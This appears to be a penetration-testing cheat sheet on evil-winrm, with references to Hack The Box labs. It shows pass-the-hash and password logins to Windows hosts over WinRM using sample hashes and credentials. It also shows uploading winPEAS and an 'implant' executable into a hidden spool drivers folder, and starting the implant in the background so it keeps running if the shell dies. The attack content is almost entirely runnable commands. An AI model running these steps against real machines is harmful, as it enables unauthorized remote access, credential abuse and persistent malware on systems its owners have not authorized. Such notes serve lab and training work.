# evil-winrm

* `evil-winrm` is used to take advantage of machines with port 5985 or 5986 open which is Powershell Remoting.
* This will provide shell level access to the machine with the user account that you have compromised. &#x20;
* You can auth either with a hash or password
* Supports SSL

### Usage

* Connect with pass the hash attack

```
evil-winrm -i 10.10.100.15 -u administrator -H "c2597747aa5e43022a3a3049a3c3b09d"
```

* Password Authentication:

```
evil-winrm -i 10.10.100.15 -u a-whitehat -p "bNdKVkjv3RR9ht"
```

### evil-winrm Docker

* I have had issues with `evil-winrm` running properly on non kali Linux distros such as Ubuntu.
* One simple work around is to pull a Kali Docker image and utilize that&#x20;

<pre><code>docker pull kalilinux/kali-rolling
<strong>sudo docker run --tty --interactive kalilinux/kali-rolling
</strong>evil-winrm -i 172.16.2.5 -u 'DANTE.ADMIN\jbercov' -p mypass123
</code></pre>

* copy files from host into evil-winrm docker container&#x20;

```
sudo docker cp /opt/winPEASx64.exe 3faed2add6c3:/opt
docker cp /home/ubuntu/Documents/htb/cicada/exploit/cicada.htb.exe bbf6c66e54c3:/opt
```

### evil-winrm Service enumeration

* you can use a builtin from evil-winrm to enumerate services on a remote endpoint

```
services
Path                                                                           Privileges Service          
----                                                                           ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                           False ADWS             
C:\Windows\HQbCgOtZ.exe                                                             False fGnb             
C:\Windows\qiFePsnh.exe                                                             False fYCF             
C:\Windows\FxRmIulx.exe                                                             False gbkS             
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                        True NetTcpPortSharing
C:\Windows\rIiHdlwq.exe                                                             False odgx
--snip-- 
```

### evil-winrm file upload

* use the builtin for evil-winrm to upload files from your attackbox to the remote host&#x20;

```
upload /opt/winPEASx64.exe 
Info: Uploading /opt/winPEASx64.exe to C:\Windows\system32\spool\drivers\color\winPEASx64.exe
```

### WinRM Implant Execution

* start your implant in the background so if your evil-winrm shell dies your implant will continue to run&#x20;

```
cmd.exe /c start /b C:\Windows\System32\spool\drivers\color\cicada.htb.exe
```
